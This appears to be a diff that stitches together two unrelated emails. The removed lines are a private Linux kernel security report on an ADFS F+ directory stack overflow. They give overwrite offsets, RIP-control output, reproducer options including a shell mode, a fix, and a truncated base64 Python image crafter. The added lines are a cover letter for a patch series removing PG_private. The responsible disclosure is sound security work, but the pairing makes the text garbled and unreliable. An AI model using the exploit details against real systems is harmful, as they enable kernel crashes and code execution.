-all supported stable branches. I am reporting privately per documentation
-process. A tested reproducer and a tested one-line fix are included below.
-I am happy to coordinate and would like a CVE assigned once a fix is
-applied.
+Overview
+===
+Most code uses folio_attach/detach/change_private() functions, so folio
+refcount is increased and decreased when folio->private is set and reset,
+respectively. There is no need to change them.
 
+Changes are needed for exceptional users:
+1. zsmalloc uses PG_private to indicate first component zpdesc page and
+   page->private is used to store zspage in zpdesc. To remove PG_private,
+   is_first_zpdesc() is changed to zpdesc->zspage->first_zpdesc == zpdesc
+   instead of checking PG_private.
 
-1. AFFECTED VERSION RANGE
--------------------------
-Present since the 2020 ADFS big-directory rework (~v5.6);
-fs/adfs/dir_fplus.c
-was last touched on 2020-01-25 (587065d) and is unchanged since.
+2. kernel/events/ring_buffer.c stores page order in page->private.
+   Replacing PG_private with page->private != NULL works.
 
-  Vulnerable, reproduced:      v7.0.1
-  Vulnerable, code-identical:  mainline v7.2-rc5
-  Affected:                    v5.6 -> v7.2-rc5
-(5.10/5.15/6.1/6.6/6.12/6.18/7.0/7.1/7.2-rc)
+3. drivers/xen/grant-table.c stores xen_page_foreign in page->private,
+   where on 32-bit, a pointer to xen_page_foreign is stored; on 64-bit,
+   page->private is used as xen_page_foreign. PG_private check is replaced
+   by page->private != NULL on 32-bit for xen_page_foreign deallocation.
+   On 64-bit, page->private is cleared unconditionally since {domid=0,
+   gref=0} (xen_page_foreign can be 0) is valid.
 
-I verified the vulnerable sequence is byte-for-byte identical in current
-mainline (adfs_fplus_getnext() + adfs_fplus_validate_header()).
-CONFIG_ADFS_FS is shipped as a module on typical distros (confirmed:
-adfs.ko present under /lib/modules on a 6.18 kernel).
+4. fs/crypto/crypto.c stores a folio pointer in page->private, PG_private
+   checks are replaced by page->private != NULL.
 
+5. fs/erofs has two different uses:
 
-2. DESCRIPTION
---------------
-adfs_fplus_getnext() (fs/adfs/dir_fplus.c) reads the per-entry name length
-field bigdirobnamelen (an unvalidated __le32, struct adfs_bigdirentry) and
-uses it directly as the copy length into struct object_info.name, which is
-char[ADFS_MAX_NAME_LEN] = char[260] (fs/adfs/adfs.h). struct object_info is
-held on the caller's stack -- adfs_fplus_iterate() declares it locally
-(dir_fplus.c:212); adfs_lookup() uses the same on-stack pattern
-(dir.c:434). adfs_fplus_validate_header() checks only AGGREGATE sizes
-(directory name length, total names area, entries*stride); it never bounds
-the per-entry bigdirobnamelen. adfs_dir_copyfrom() bounds the source only
-against dir->nr_buffers, never against the destination.
+    5a. folio->private is used to form a reversed list of
+    the outputs of readahead_folio(). readahead_folio_reverse() is added to
+    output folios in reversed order, so that ->private is no longer needed.
 
-Therefore a crafted ADFS F+ image whose entry has bigdirobnamelen > 260
-overflows obj->name on the kernel stack. The path is reached when the
-directory is enumerated (readdir/getdents64) or an entry is looked up, on a
-mounted image.
+    5b. folio->private is used as an in-flight I/O counter. Convert the
+    code to use folio_attach/detach/get_private().
 
-Relevant code (dir_fplus.c):
+6. fs/nfs/write.c: folio refcount maintenance is in a bigger scope than
+   folio->private. So folio_attach/detach/get_private() is not used.
+   Nothing to change.
 
-    obj->name_len = le32_to_cpu(bde.bigdirobnamelen);          /* unbounded
-*/
-    ...
-    ret = adfs_dir_copyfrom(obj->name, dir, offset, obj->name_len);  /*
-OVERFLOW */
+7. fs/f2fs uses attach_page_private() to first reset folio->private then
+   immediately sets PAGE_PRIVATE_NOT_POINTER bit on it. Change it to use
+   attach_page_private() to set PAGE_PRIVATE_NOT_POINTER bit directly to
+   avoid folio->private == NULL gap inside set_page_private_##name().
 
-Trace (KASAN build, real mount + ls, by task ls):
+8. hugetlb uses folio_change_private(folio, NULL) without folio refcount
+   maintenance. Change it to folio->private = NULL.
 
-    BUG: KASAN: stack-out-of-bounds in adfs_object_fixup+0xa2/0x40f
-    Read of size 1 ... by task ls/31
-    Call Trace:
-     adfs_object_fixup+0xa2/0x40f
-     adfs_fplus_getnext+0x403/0x477
-     adfs_fplus_iterate+0x186/0x26e
-     iterate_dir ... sys_getdents64
-    The vulnerable address belongs to stack of task ls and is located at
-offset 320 in frame adfs_fplus_iterate; this frame has 1 object: [32, 320)
-'obj' (offset 320 == obj->name[260]).
+After the above changes, PG_private ops are converted to
+page/folio->private ops.
 
-IMPACT. Two outcomes depending on build hardening:
+folio_test_fs_private() is added to check filesystem-only private data by
+excluding swapcache and hugetlb folios, because swapcache folios overlap
+swp_entry_t swap with ->private and hugetlb sets its own flags in
+->private.
 
-  - Hardened kernel (CONFIG_STACKPROTECTOR_STRONG, distro default): the
-frame has a canary. The overflow trips __stack_chk_fail -> reliable kernel
-panic (denial of service).
-  - Un-canaried build (e.g. custom/embedded, or a KASAN/fuzz build): the
-saved return address of adfs_fplus_iterate is within reach. I demonstrated
-arbitrary kernel instruction-pointer control, trimming the overflow to 388
-bytes overwrites the saved return address (obj->name[380..388]) while
-leaving the caller's struct adfs_dir intact, and execution reaches a clean
-ret. Planting 0xffffffff43434343 there makes the kernel fault at exactly
-that IP (Kernel panic ... ip 0xffffffff43434343). A non-canonical value
-faults at the ret instruction (adfs_fplus_iterate+0x26d). So on such builds
-this is kernel code execution.
+Note
+===
+1. KPF_PRIVATE has a minor semantic change. Since PG_private will be
+   removed, KPF_PRIVATE represents pagecache folios whose ->mapping is not
+   NULL and with ->private set. Currently KPF_PRIVATE can be set for
+   orphaned pagecache folios with ->mapping == NULL.
 
-REACHABILITY / SCOPE : ADFS is a local block filesystem (only
-register_filesystem + FS_REQUIRES_DEV no network parser), so it is NOT
-remotely triggerable. Mounting requires CAP_SYS_ADMIN; adfs has no
-FS_USERNS_MOUNT, so unprivileged user-namespace mount is blocked, i.e. it
-is not an unprivileged no preconditions LPE. It becomes a real LPE/kernel
-compromise only on un-canaried builds where a privileged context mounts an
-attacker image (root in container that can mount, a VM/storage host
-attaching untrusted images, or removable-media auto-mount where libblkid
-recognises ADFS).
+2. Documentation/mm/hugetlbfs_reserv.rst is outdated, so I did not remove
+   PG_private related text. It should be rewritten.
 
-I also verified, on a representative host, that libblkid does not even list
-ADFS, so udisks auto-mount is closed there the practical default-distro
-outcome is DoS, not LPE.
+3. PG_folio is planned to be set on every page from a folio in
+   page_rmappable_folio(), so folios with any order (currently
+   PG_large_rmappable is used to identify >0 order folios) can be
+   identified, vm_insert_*() can correctly reject all folios, and rmap code
+   can accept only folios. Eventually, page_folio() will return NULL for
+   non-folio pages.
 
+Tests
+===
+1. allmodconfig build passed.
 
-3. REPRODUCER
--------------
-A python file is attached. It builds a 16 KiB ADFS F+ image by hand
-(correct disc record, zone check and bigdir checkbyte so it mounts cleanly)
-with bigdirobnamelen = 512, then either boots a UML/KASAN kernel
-(safe, default) or mounts on the host. It can be executed with following
-arguments:
-    python3 test_adfs_overflow.py            # craft + KASAN detect; exit 1
-== vulnerable
-    python3 test_adfs_overflow.py --rip      # demonstrate RIP control
-(un-canaried)
-    python3 test_adfs_overflow.py --craft-only out.img
-    python3 test_adfs_overflow.py --sh # executing the bash shell
-The script is a standalone crafter, the RIP variant and the captured
-KASAN/RIP logs are available on request. Output of the default run against
-v7.0.1 (UML/KASAN):
+2. zsmalloc is tested using ext4 on a 1GB lz4 zram:
+    2a. zram load + zsmalloc compaction;
+    2b. concurrent zspage migration via memory compaction;
+    2c. confirmed that multi-page zspages actually formed.
 
-    ==== DETECTION SIGNALS ====
-      mount_ok    = True
-      kasan       = True
-      adfs_hits   =
-['adfs_object_fixup','adfs_fplus_getnext','adfs_fplus_iterate']
-      obj_frame   = True
-      panic       = True
-      controlled  = True
-      RESULT: VULNERABLE -- confirmed ADFS dir_fplus stack overflow.
+    Details: https://github.com/x-y-z/linux-dev/blob/b4/remove-pg_private/test_zsmalloc.md
 
-And with --rip on the same (un-canaried) build:
+3. erofs is tested on images created with -C4096 and lz4hc, lzma,
+   deflate, and zstd algorithms:
+   3a. cold read of all files, verify checksums match source;
+   3b. readahead + reclaim/migration race.
 
-      fault_ip      = 0xffffffff43434343
-      canonical_hit = True
-      RESULT: RIP CONTROL DEMONSTRATED.
+   Details: https://github.com/x-y-z/linux-dev/blob/b4/remove-pg_private/test_erofs.md
 
+4. fscrypt is tested on software-encrypted ext4 with writes to exercise
+   bounce pages.
 
-4. CONDITIONS
--------------
-- CONFIG_ADFS_FS built-in or module-loaded.
-- Triggered by readdir/getdents or name lookup on a mounted image. Mount
-needs CAP_SYS_ADMIN.
-- For the KASAN detection signal: CONFIG_KASAN=y (+ CONFIG_KASAN_STACK=y).
-- For the RIP-control primitive: the affected frame must lack a stack
-canary (no CONFIG_STACKPROTECTOR, or a fuzz/KASAN build). On
-CONFIG_STACKPROTECTOR_STRONG builds the outcome is the DoS case above.
+   Details: https://github.com/x-y-z/linux-dev/blob/b4/remove-pg_private/test_fscrypt.md
 
+5. f2fs is tested on an image with inline_data,compress_algorithm=lz4:
+    5a. INLINE_INODE — lots of tiny files;
+    5b. REF_RESOURCE + general writeback — buffered write churn with fsync;
+    5c. ONGOING_MIGRATION — force GC / page migration;
+    5d. ATOMIC_WRITE — atomic-write ioctl path.
 
-5. PROPOSED FIX (inline tested patch, applies cleanly on v7.2-rc5)
--------------------------------------------------------------------
-Bound bigdirobnamelen against the destination buffer before the copy. This
-stops both the KASAN overflow and the RIP-control variant (a
-bigdirobnamelen of 512 or 388 is rejected with -EIO before the copy). I can
-add a second change to adfs_fplus_validate_header() to validate per-entry
-name pointers up front if preferred.
+    Details: https://github.com/x-y-z/linux-dev/blob/b4/remove-pg_private/test_f2fs.md
+    (I did not run xfstests)
 
-[PATCH] adfs: bound big-directory entry name length in adfs_fplus_getnext()
+6. MM selftests passed.
 
-Bound bigdirobnamelen against ADFS_MAX_NAME_LEN before the copy.
+LLM use
+===
+Claude was used to form a concrete plan on what code needs to be changed
+and how to change them. The plan was reviewed by Codex until no issue was
+spotted.
 
+Plan is at: https://github.com/x-y-z/linux-dev/blob/b4/remove-pg_private/plan.md
+
+I then followed the plan to make code changes. I did bounce ideas with
+Claude how to change fs/erofs, since I did not like the original idea.
+After each change, I asked Claude to review my code and git commit message.
+I also asked Claude to give me test plans (see above).
+
+At last, Codex was used to review all patches.
+
+Comments and suggestions are welcome. Thanks.
+
+Assisted-by: Claude:claude-opus-4-8
+Assisted-by: Codex:gpt-5
+Signed-off-by: Zi Yan <ziy@nvidia.com>
 ---
- fs/adfs/dir_fplus.c | 2 ++
- 1 file changed, 2 insertions(+)
+Zi Yan (14):
+      mm/zsmalloc: replace PG_private with pointer comparison
+      perf/ring_buffer: stop using PG_private as AUX page high-order marker
+      xen/grant-table: stop setting PG_private on pages for grant mapping
+      fs/crypto: stop setting PG_private on bounce page
+      mm/hugetlb: use direct assignment instead of folio_change_private()
+      fs/f2fs: stop using PG_private
+      fs/erofs: mm/pagemap: add readahead_folio_reverse() to avoid folio->private
+      fs/erofs: use folio_attach/detach_private() instead of direct assignment
+      mm/page-flags: check page/folio->private instead of PG_private
+      mm/page-flags: introduce folio_test_fs_private()
+      treewide: remove folio_set/clear_private()
+      treewide: replace PagePrivate() with page_private()
+      treewide: adjust comments on PagePrivate and PG_private
+      mm/page-flags: remove PG_private
 
-diff --git a/fs/adfs/dir_fplus.c b/fs/adfs/dir_fplus.c
---- a/fs/adfs/dir_fplus.c
-+++ b/fs/adfs/dir_fplus.c
-@@ -192,6 +192,8 @@
-  obj->indaddr  = le32_to_cpu(bde.bigdirindaddr);
-  obj->attr     = le32_to_cpu(bde.bigdirattr);
-  obj->name_len = le32_to_cpu(bde.bigdirobnamelen);
-+ if (obj->name_len > ADFS_MAX_NAME_LEN)
-+ return -EIO;
+ Documentation/admin-guide/kdump/vmcoreinfo.rst |  2 +-
+ Documentation/filesystems/vfs.rst              |  6 ++--
+ arch/x86/events/intel/bts.c                    |  3 --
+ arch/x86/events/intel/pt.c                     |  6 ++--
+ drivers/md/md-bitmap.c                         |  6 ++--
+ drivers/xen/balloon.c                          |  5 ++++
+ drivers/xen/grant-table.c                      |  7 ++---
+ fs/ceph/addr.c                                 |  8 ++----
+ fs/crypto/crypto.c                             |  2 --
+ fs/erofs/data.c                                |  5 ++--
+ fs/erofs/zdata.c                               | 11 ++------
+ fs/f2fs/f2fs.h                                 |  8 +++---
+ fs/nfs/file.c                                  |  4 +--
+ fs/nfs/write.c                                 |  2 --
+ fs/proc/page.c                                 |  5 +++-
+ fs/ubifs/file.c                                |  6 ++--
+ include/linux/buffer_head.h                    |  6 ----
+ include/linux/mm.h                             | 16 +++++------
+ include/linux/mm_types.h                       |  4 +--
+ include/linux/page-flags.h                     | 38 ++++++++++++++++++--------
+ include/linux/pagemap.h                        | 35 ++++++++++++++++++++++--
+ include/trace/events/mmflags.h                 |  2 +-
+ include/trace/events/pagemap.h                 |  2 +-
+ kernel/events/ring_buffer.c                    |  7 ++---
+ kernel/vmcore_info.c                           |  1 -
+ mm/huge_memory.c                               |  2 +-
+ mm/hugetlb.c                                   |  6 ++--
+ mm/migrate.c                                   |  3 +-
+ mm/page-writeback.c                            |  5 +++-
+ mm/vmscan.c                                    |  3 +-
+ mm/zpdesc.h                                    |  2 +-
+ mm/zsmalloc.c                                  | 15 ++--------
+ 32 files changed, 127 insertions(+), 106 deletions(-)
+---
+base-commit: bcd5eb68a6a189497eb26c1b9f622538aa48895d
+change-id: 20260728-remove-pg_private-cfe926c7f83c
 
-  offset = adfs_fplus_offset(h, le32_to_cpu(h->bigdirentries));
-  offset += le32_to_cpu(bde.bigdirobnameptr);
-----
+Best regards,
+-- 
+Yan, Zi
 
-
-I'd be grateful if you could confirm receipt and on request a CVE via
-cve@kernel.org once the fix is in a stable tree. I will not discuss this
-publicly or with linux-distros until a fix is accepted.
-
-Thanks and Regards,
-Tridev
-Vulnerability Researcher
-Zerotrace Lab
-
---0000000000000542c80657f2e233
-Content-Type: text/html; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
-
-<div dir=3D"ltr">Hi Security Team,<br><br>I am reporting a security vulnera=
-bility in the ADFS filesystem driver (fs/adfs/dir_fplus.c), which is mainta=
-ined under the FILESYSTEMS (VFS) entry. It is unfixed in mainline (v7.2-rc5=
-) and, as far as I can tell, in all supported stable branches. I am reporti=
-ng privately per documentation process. A tested reproducer and a tested on=
-e-line fix are included below. I am happy to coordinate and would like a CV=
-E assigned once a fix is applied.<br><br><br>1. AFFECTED VERSION RANGE<br>-=
-------------------------<br>Present since the 2020 ADFS big-directory rewor=
-k (~v5.6); fs/adfs/dir_fplus.c<br>was last touched on 2020-01-25 (587065d) =
-and is unchanged since.<br><br>=C2=A0 Vulnerable, reproduced: =C2=A0 =C2=A0=
- =C2=A0v7.0.1<br>=C2=A0 Vulnerable, code-identical: =C2=A0mainline v7.2-rc5=
-<br>=C2=A0 Affected: =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
-=A0 =C2=A0 =C2=A0v5.6 -&gt; v7.2-rc5 (5.10/5.15/6.1/6.6/6.12/6.18/7.0/7.1/7=
-.2-rc)<br>=C2=A0 <br>I verified the vulnerable sequence is byte-for-byte id=
-entical in current mainline (adfs_fplus_getnext() + adfs_fplus_validate_hea=
-der()). CONFIG_ADFS_FS is shipped as a module on typical distros (confirmed=
-: adfs.ko present under /lib/modules on a 6.18 kernel).<br><br><br>2. DESCR=
-IPTION<br>--------------<br>adfs_fplus_getnext() (fs/adfs/dir_fplus.c) read=
-s the per-entry name length field bigdirobnamelen (an unvalidated __le32, s=
-truct adfs_bigdirentry) and uses it directly as the copy length into struct=
- <a href=3D"http://object_info.name">object_info.name</a>, which is char[AD=
-FS_MAX_NAME_LEN] =3D char[260] (fs/adfs/adfs.h). struct object_info is held=
- on the caller&#39;s stack -- adfs_fplus_iterate() declares it locally (dir=
-_fplus.c:212); adfs_lookup() uses the same on-stack pattern (dir.c:434). ad=
-fs_fplus_validate_header() checks only AGGREGATE sizes (directory name leng=
-th, total names area, entries*stride); it never bounds the per-entry bigdir=
-obnamelen. adfs_dir_copyfrom() bounds the source only against dir-&gt;nr_bu=
-ffers, never against the destination.<br><br>Therefore a crafted ADFS F+ im=
-age whose entry has bigdirobnamelen &gt; 260 overflows obj-&gt;name on the =
-kernel stack. The path is reached when the directory is enumerated (readdir=
-/getdents64) or an entry is looked up, on a mounted image.<br><br>Relevant =
-code (dir_fplus.c):<br><br>=C2=A0 =C2=A0 obj-&gt;name_len =3D le32_to_cpu(b=
-de.bigdirobnamelen); =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0/* unbounded */<br>=
-=C2=A0 =C2=A0 ...<br>=C2=A0 =C2=A0 ret =3D adfs_dir_copyfrom(obj-&gt;name, =
-dir, offset, obj-&gt;name_len); =C2=A0/* OVERFLOW */<br><br>Trace (KASAN bu=
-ild, real mount + ls, by task ls):<br><br>=C2=A0 =C2=A0 BUG: KASAN: stack-o=
-ut-of-bounds in adfs_object_fixup+0xa2/0x40f<br>=C2=A0 =C2=A0 Read of size =
-1 ... by task ls/31<br>=C2=A0 =C2=A0 Call Trace:<br>=C2=A0 =C2=A0 =C2=A0adf=
-s_object_fixup+0xa2/0x40f<br>=C2=A0 =C2=A0 =C2=A0adfs_fplus_getnext+0x403/0=
-x477<br>=C2=A0 =C2=A0 =C2=A0adfs_fplus_iterate+0x186/0x26e<br>=C2=A0 =C2=A0=
- =C2=A0iterate_dir ... sys_getdents64<br>=C2=A0 =C2=A0 The vulnerable addre=
-ss belongs to stack of task ls and is located at offset 320 in frame adfs_f=
-plus_iterate; this frame has 1 object: [32, 320) &#39;obj&#39; (offset 320 =
-=3D=3D obj-&gt;name[260]).<br><br>IMPACT. Two outcomes depending on build h=
-ardening:<br><br>=C2=A0 - Hardened kernel (CONFIG_STACKPROTECTOR_STRONG, di=
-stro default): the frame has a canary. The overflow trips __stack_chk_fail =
--&gt; reliable kernel panic (denial of service).<br>=C2=A0 - Un-canaried bu=
-ild (e.g. custom/embedded, or a KASAN/fuzz build): the saved return address=
- of adfs_fplus_iterate is within reach. I demonstrated arbitrary kernel ins=
-truction-pointer control, trimming the overflow to 388 bytes overwrites the=
- saved return address (obj-&gt;name[380..388]) while leaving the caller&#39=
-;s struct adfs_dir intact, and execution reaches a clean ret. Planting 0xff=
-ffffff43434343 there makes the kernel fault at exactly that IP (Kernel pani=
-c ... ip 0xffffffff43434343). A non-canonical value faults at the ret instr=
-uction (adfs_fplus_iterate+0x26d). So on such builds this is kernel code ex=
-ecution.<br><br>REACHABILITY / SCOPE : ADFS is a local block filesystem (on=
-ly register_filesystem + FS_REQUIRES_DEV no network parser), so it is NOT r=
-emotely triggerable. Mounting requires CAP_SYS_ADMIN; adfs has no FS_USERNS=
-_MOUNT, so unprivileged user-namespace mount is blocked, i.e. it is not an =
-unprivileged no preconditions LPE. It becomes a real LPE/kernel compromise =
-only on un-canaried builds where a privileged context mounts an attacker im=
-age (root in container that can mount, a VM/storage host attaching untruste=
-d images, or removable-media auto-mount where libblkid recognises ADFS).<br=
-><br>I also verified, on a representative host, that libblkid does not even=
- list ADFS, so udisks auto-mount is closed there the practical default-dist=
-ro outcome is DoS, not LPE.<br><br><br>3. REPRODUCER<br>-------------<br>A =
-python file is attached. It builds a 16 KiB ADFS F+ image by hand (correct =
-disc record, zone check and bigdir checkbyte so it mounts cleanly) with big=
-dirobnamelen =3D 512, then either boots a UML/KASAN kernel<br>(safe, defaul=
-t) or mounts on the host. It can be executed with following arguments:<br>=
-=C2=A0 =C2=A0 python3 test_adfs_overflow.py =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
-=A0 =C2=A0# craft + KASAN detect; exit 1 =3D=3D vulnerable<br>=C2=A0 =C2=A0=
- python3 test_adfs_overflow.py --rip =C2=A0 =C2=A0 =C2=A0# demonstrate RIP =
-control (un-canaried)<br>=C2=A0 =C2=A0 python3 test_adfs_overflow.py --craf=
-t-only out.img<br>=C2=A0 =C2=A0 python3 test_adfs_overflow.py --sh # execut=
-ing the bash shell<br>The script is a standalone crafter, the RIP variant a=
-nd the captured KASAN/RIP logs are available on request. Output of the defa=
-ult run against v7.0.1 (UML/KASAN):<br><br>=C2=A0 =C2=A0 =3D=3D=3D=3D DETEC=
-TION SIGNALS =3D=3D=3D=3D<br>=C2=A0 =C2=A0 =C2=A0 mount_ok =C2=A0 =C2=A0=3D=
- True<br>=C2=A0 =C2=A0 =C2=A0 kasan =C2=A0 =C2=A0 =C2=A0 =3D True<br>=C2=A0=
- =C2=A0 =C2=A0 adfs_hits =C2=A0 =3D [&#39;adfs_object_fixup&#39;,&#39;adfs_=
-fplus_getnext&#39;,&#39;adfs_fplus_iterate&#39;]<br>=C2=A0 =C2=A0 =C2=A0 ob=
-j_frame =C2=A0 =3D True<br>=C2=A0 =C2=A0 =C2=A0 panic =C2=A0 =C2=A0 =C2=A0 =
-=3D True<br>=C2=A0 =C2=A0 =C2=A0 controlled =C2=A0=3D True<br>=C2=A0 =C2=A0=
- =C2=A0 RESULT: VULNERABLE -- confirmed ADFS dir_fplus stack overflow.<br><=
-br>And with --rip on the same (un-canaried) build:<br><br>=C2=A0 =C2=A0 =C2=
-=A0 fault_ip =C2=A0 =C2=A0 =C2=A0=3D 0xffffffff43434343<br>=C2=A0 =C2=A0 =
-=C2=A0 canonical_hit =3D True<br>=C2=A0 =C2=A0 =C2=A0 RESULT: RIP CONTROL D=
-EMONSTRATED.<br><br><br>4. CONDITIONS<br>-------------<br>- CONFIG_ADFS_FS =
-built-in or module-loaded.<br>- Triggered by readdir/getdents or name looku=
-p on a mounted image. Mount needs CAP_SYS_ADMIN.<br>- For the KASAN detecti=
-on signal: CONFIG_KASAN=3Dy (+ CONFIG_KASAN_STACK=3Dy).<br>- For the RIP-co=
-ntrol primitive: the affected frame must lack a stack canary (no CONFIG_STA=
-CKPROTECTOR, or a fuzz/KASAN build). On CONFIG_STACKPROTECTOR_STRONG builds=
- the outcome is the DoS case above.<br><br><br>5. PROPOSED FIX (inline test=
-ed patch, applies cleanly on v7.2-rc5)<br>---------------------------------=
-----------------------------------<br>Bound bigdirobnamelen against the des=
-tination buffer before the copy. This stops both the KASAN overflow and the=
- RIP-control variant (a bigdirobnamelen of 512 or 388 is rejected with -EIO=
- before the copy). I can add a second change to adfs_fplus_validate_header(=
-) to validate per-entry name pointers up front if preferred.<br><br>[PATCH]=
- adfs: bound big-directory entry name length in adfs_fplus_getnext()<br><br=
->Bound bigdirobnamelen against ADFS_MAX_NAME_LEN before the copy.<br><br>--=
--<br>=C2=A0fs/adfs/dir_fplus.c | 2 ++<br>=C2=A01 file changed, 2 insertions=
-(+)<br><br>diff --git a/fs/adfs/dir_fplus.c b/fs/adfs/dir_fplus.c<br>--- a/=
-fs/adfs/dir_fplus.c<br>+++ b/fs/adfs/dir_fplus.c<br>@@ -192,6 +192,8 @@<br>=
-=C2=A0	obj-&gt;indaddr =C2=A0=3D le32_to_cpu(bde.bigdirindaddr);<br>=C2=A0	=
-obj-&gt;attr =C2=A0 =C2=A0 =3D le32_to_cpu(bde.bigdirattr);<br>=C2=A0	obj-&=
-gt;name_len =3D le32_to_cpu(bde.bigdirobnamelen);<br>+	if (obj-&gt;name_len=
- &gt; ADFS_MAX_NAME_LEN)<br>+		return -EIO;<br><br>=C2=A0	offset =3D adfs_f=
-plus_offset(h, le32_to_cpu(h-&gt;bigdirentries));<br>=C2=A0	offset +=3D le3=
-2_to_cpu(bde.bigdirobnameptr);<br>----<br><br><br>I&#39;d be grateful if yo=
-u could confirm receipt and on request a CVE via <a href=3D"mailto:cve@kern=
-el.org">cve@kernel.org</a> once the fix is in a stable tree. I will not dis=
-cuss this publicly or with linux-distros until a fix is accepted.<br><br>Th=
-anks and Regards,<br>Tridev<br>Vulnerability Researcher<br>Zerotrace Lab<br=
-><br><br></div>
-
---0000000000000542c80657f2e233--
---0000000000000542c90657f2e235
-Content-Type: text/x-python; charset="UTF-8"; name="test_adfs_overflow.py"
-Content-Disposition: attachment; filename="test_adfs_overflow.py"
-Content-Transfer-Encoding: base64
-Content-ID: <f_ms9qokqt0>
-X-Attachment-Id: f_ms9qokqt0
-
-aW1wb3J0IGFyZ3BhcnNlCmltcG9ydCBvcwppbXBvcnQgcmUKaW1wb3J0IHNodXRpbAppbXBvcnQg
-c3RydWN0CmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBzeXMKaW1wb3J0IHRlbXBmaWxlCgojID09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PQojIDEuIEltYWdlIGNyYWZ0ZXIgKHBvcnRlZCB2ZXJiYXRpbSBmcm9t
-IHRoZSB2ZXJpZmllZCBwb2MvY3JhZnRfYWRmcy5weSkKIyA9PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KCkJM
-SyA9IDUxMgpOVU1fQkxPQ0tTID0gMzIKSU1HX1NJWkUgPSBOVU1fQkxPQ0tTICogQkxLICAgICAg
-ICAgICAgIyAxNjM4NAoKTE9HMlNFQ1NJWkUgPSA5ICAgICAgICAgICAgICAgICAgICAgICAgIyA1
-MTItYnl0ZSBzZWN0b3JzCklETEVOID0gMTIKTE9HMkJQTUIgPSA5ICAgICAgICAgICAgICAgICAg
-ICAgICAgICAgIyAxIG1hcCBiaXQgPT0gNTEyIGJ5dGVzClpPTkVfU1BBUkUgPSAwCk5aT05FUyA9
-IDEKRk9STUFUX1ZFUlNJT04gPSAxICAgICAgICAgICAgICAgICAgICAgIyBzZWxlY3RzIGFkZnNf
-ZnBsdXNfZGlyX29wcyAoRispCkxPRzJTSEFSRVNJWkUgPSAwCkRJU0NfU0laRSA9IElNR19TSVpF
-ClJPT1RfSU5EREFERFIgPSAweDAwMDAwMjAwICAgICAgICAgICAgICMgZnJhZyBpZCAyICg+Pjgp
-ID09IEFERlNfUk9PVF9GUkFHClJPT1RfU0laRSA9IDIwNDgKCkJJR0RJUlNUQVJUTkFNRSA9IChv
-cmQoJ1MnKSB8IG9yZCgnQicpIDw8IDggfCBvcmQoJ1AnKSA8PCAxNiB8IG9yZCgncicpIDw8IDI0
-KQpCSUdESVJFTkROQU1FICAgPSAob3JkKCdvJykgfCBvcmQoJ3YnKSA8PCA4IHwgb3JkKCdlJykg
-PDwgMTYgfCBvcmQoJ24nKSA8PCAyNCkKCgpkZWYgX2xlMTYodik6IHJldHVybiBzdHJ1Y3QucGFj
-aygnPEgnLCB2ICYgMHhGRkZGKQpkZWYgX2xlMzIodik6IHJldHVybiBzdHJ1Y3QucGFjaygnPEkn
-LCB2ICYgMHhGRkZGRkZGRikKCgpkZWYgX3NldF9iaXQoYnVmLCBiaXRwb3MsIHZhbCk6CiAgICBi
-aSwgYm8gPSBkaXZtb2QoYml0cG9zLCA4KQogICAgaWYgdmFsOgogICAgICAgIGJ1ZltiaV0gfD0g
-KDEgPDwgYm8pCiAgICBlbHNlOgogICAgICAgIGJ1ZltiaV0gJj0gfigxIDw8IGJvKQoKCmRlZiBf
-cm9yMzIodiwgbik6CiAgICBuICY9IDMxCiAgICByZXR1cm4gKCh2ID4+IG4pIHwgKHYgPDwgKDMy
-IC0gbikpKSAmIDB4RkZGRkZGRkYKCgpkZWYgX2NhbGNfem9uZWNoZWNrKG0pOgogICAgIiIiUmVw
-bGljYXRlIGFkZnNfY2FsY3pvbmVjaGVjayAoZnMvYWRmcy9tYXAuYykgb3ZlciBhIDUxMi1ieXRl
-IHpvbmUuIiIiCiAgICB2MCA9IHYxID0gdjIgPSB2MyA9IDAKICAgIGkgPSA1MTIgLSA0CiAgICB3
-aGlsZSBpOgogICAgICAgIHYwID0gKHYwICsgbVtpXSAgICAgKyAodjMgPj4gOCkpICYgMHhmZmZm
-ZmZmZjsgdjMgJj0gMHhmZgogICAgICAgIHYxID0gKHYxICsgbVtpICsgMV0gKyAodjAgPj4gOCkp
-ICYgMHhmZmZmZmZmZjsgdjAgJj0gMHhmZgogICAgICAgIHYyID0gKHYyICsgbVtpICsgMl0gKyAo
-djEgPj4gOCkpICYgMHhmZmZmZmZmZjsgdjEgJj0gMHhmZgogICAgICAgIHYzID0gKHYzICsgbVtp
-ICsgM10gKyAodjIgPj4gOCkpICYgMHhmZmZmZmZmZjsgdjIgJj0gMHhmZgogICAgICAgIGkgLT0g
-NAogICAgdjAgPSAodjAgKyAodjMgPj4gOCkpICYgMHhmZmZmZmZmZgogICAgdjEgPSAodjEgKyBt
-WzFdICsgKHYwID4+IDgpKSAmIDB4ZmZmZmZmZmYKICAgIHYyID0gKHYyICsgbVsyXSArICh2MSA+
-PiA4KSkgJiAweGZmZmZmZmZmCiAgICB2MyA9ICh2MyArIG1bM10gKyAodjIgPj4gOCkpICYgMHhm
-ZmZmZmZmZgogICAgcmV0dXJuICh2MCBeIHYxIF4gdjIgXiB2MykgJiAweGZmCgoKZGVmIF9jYWxj
-X2JpZ2Rpcl9jaGVja2J5dGUoZGlyYnVmLCBlbmQpOgogICAgIiIiUmVwbGljYXRlIGFkZnNfZnBs
-dXNfY2hlY2tieXRlIChmcy9hZGZzL2Rpcl9mcGx1cy5jKS4iIiIKICAgIGRpcmNoZWNrID0gMAog
-ICAgb2ZmID0gMAogICAgcmVtYWluaW5nID0gZW5kCiAgICB3aGlsZSByZW1haW5pbmc6CiAgICAg
-ICAgYnMgPSBCTEsgaWYgQkxLIDwgcmVtYWluaW5nIGVsc2UgcmVtYWluaW5nCiAgICAgICAgaSA9
-IDAKICAgICAgICB3aGlsZSBpIDwgYnM6CiAgICAgICAgICAgIHcgPSBzdHJ1Y3QudW5wYWNrX2Zy
